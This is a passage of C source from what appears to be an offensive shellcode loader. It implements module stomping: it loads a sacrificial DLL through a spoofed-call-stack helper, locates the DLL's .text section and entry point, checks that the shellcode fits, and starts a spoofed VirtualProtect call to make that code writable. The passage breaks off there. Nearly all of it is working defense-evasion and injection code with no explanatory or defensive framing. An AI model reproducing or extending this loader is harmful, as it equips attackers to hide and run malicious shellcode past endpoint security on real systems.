    printf("[*] Module stomping...\n");

    // LoadLibraryW via spoofed call
    FUNCTION_CALL call = {0};
    call.ptr     = (PVOID)LoadLibraryW;
    call.argc    = 1;
    call.args[0] = spoof_arg(STOMP_DLL);
    HMODULE hMod = (HMODULE)SpoofCall(&call);

    if (!hMod) {
        printf("    [-] LoadLibraryW failed\n");
        return 1;
    }
    printf("    Loaded sacrificial DLL at %p\n", hMod);

    // DisableThreadLibraryCalls
    DisableThreadLibraryCalls(hMod);

    // Find .text section and entry point
    PIMAGE_DOS_HEADER dh = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nh = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dh->e_lfanew);
    PIMAGE_SECTION_HEADER sh = IMAGE_FIRST_SECTION(nh);

    DWORD epRVA  = nh->OptionalHeader.AddressOfEntryPoint;
    PVOID ep     = (PVOID)((BYTE*)hMod + epRVA);
    DWORD textVA = 0, textSize = 0;

    for (int i = 0; i < nh->FileHeader.NumberOfSections; i++) {
        if (memcmp(sh[i].Name, ".text", 5) == 0) {
            textVA   = sh[i].VirtualAddress;
            textSize = sh[i].Misc.VirtualSize;
            break;
        }
    }

    if (!textSize) {
        printf("    [-] .text section not found\n");
        return 1;
    }

    DWORD available = textSize - (epRVA - textVA);
    printf("    .text section: %p, %lu bytes\n",
           (PVOID)((BYTE*)hMod + textVA), textSize);
    printf("    Entry point:   %p (%lu bytes available)\n", ep, available);

    if (scSize > available) {
        printf("    [-] Shellcode too large (%lu > %lu)\n", scSize, available);
        return 1;
    }

    // VirtualProtect to RW (spoofed)
    DWORD oldProt = 0;
    memset(&call, 0, sizeof(call));
    call.ptr     = (PVOID)VirtualProtect;
    call.argc    = 4;
    call.args[0] = spoof_arg(ep);
    call.args[1] = spoof_arg(scSize);
